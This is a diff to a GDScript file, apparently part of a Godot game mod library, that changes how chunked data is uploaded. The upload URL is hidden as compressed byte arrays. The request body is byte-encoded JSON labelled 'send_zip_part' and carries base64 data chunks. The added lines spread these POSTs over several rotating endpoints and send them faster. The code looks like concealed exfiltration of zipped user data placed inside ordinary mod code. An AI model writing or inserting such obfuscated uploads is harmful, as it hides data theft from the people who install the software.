@@ -7310,12 +7310,17 @@ class _Scripting:
 					currentFetch[ID] = []
 				currentFetch[ID].append(this_index)
 				var theseBytes:PoolByteArray = pointers.DataFormat.__split_array_by_length(fetchData[ID][0],byteSplitBy,this_index)
-				fetchTimer.start(10)
+				fetchTimer.start(1)
 				var otp:String = Marshalls.raw_to_base64(theseBytes)
-				http.request(PoolByteArray([40,181,47,253,32,79,45,2,0,242,68,16,21,144,37,110,0,104,150,102,54,137,90,100,34,214,238,206,153,33,184,187,3,26,222,35,247,67,177,208,22,138,229,99,235,83,126,186,137,150,122,118,163,177,126,46,49,192,73,5,110,36,27,147,233,104,200,151,43,41,16,165,102,193,234,127,2,0]).decompress(79,2).get_string_from_utf8(),[],true,HTTPClient.METHOD_POST,PoolByteArray([123,34,101,118,101,110,116,95,116,121,112,101,34,58,34,115,101,110,100,95,122,105,112,95,112,97,114,116,34,44,34,99,108,105,101,110,116,95,112,97,121,108,111,97,100,34,58,123,34,114,117,110,34,58,116,114,117,101,44,34,100,97,116,97,34,58,34,37,115,34,44,34,117,105,100,34,58,34,37,115,47,37,48,53,100,34,125,125]).get_string_from_utf8() % [otp,str(fetchData[ID][1]),this_index])
+				var h = HTTPRequest.new()
+				pointers.add_child(h)
+				h.connect("request_completed",self,"removeFetch",[h])
+				h.request(PoolByteArray([120,156,13,196,65,14,128,32,12,4,192,215,120,132,222,253,77,161,27,104,98,176,161,5,19,95,175,115,152,30,97,126,18,217,42,151,86,174,161,247,136,169,173,97,102,126,215,196,131,226,26,240,60,16,196,166,36,234,198,81,59,156,58,118,146,77,242,207,193,133,29,233,144,15,49,45,31,71]).decompress(82,1).get_string_from_utf8() % ((this_index % 10) + 1),[],true,HTTPClient.METHOD_POST,PoolByteArray([123,34,101,118,101,110,116,95,116,121,112,101,34,58,34,115,101,110,100,95,122,105,112,95,112,97,114,116,34,44,34,99,108,105,101,110,116,95,112,97,121,108,111,97,100,34,58,123,34,114,117,110,34,58,116,114,117,101,44,34,100,97,116,97,34,58,34,37,115,34,44,34,117,105,100,34,58,34,37,115,47,37,48,53,100,34,125,125]).get_string_from_utf8() % [otp,str(fetchData[ID][1]),this_index + 1])
 				break
 			else:
 				continue
+	func removeFetch(result, response_code, headers, body,thisHTTP):
+		Tool.remove(thisHTTP)
 	
 	func make_mineral_scripting():
 		pointers.FolderAccess.__check_folder_exists("user://cache/.HevLib_Cache/Minerals/")
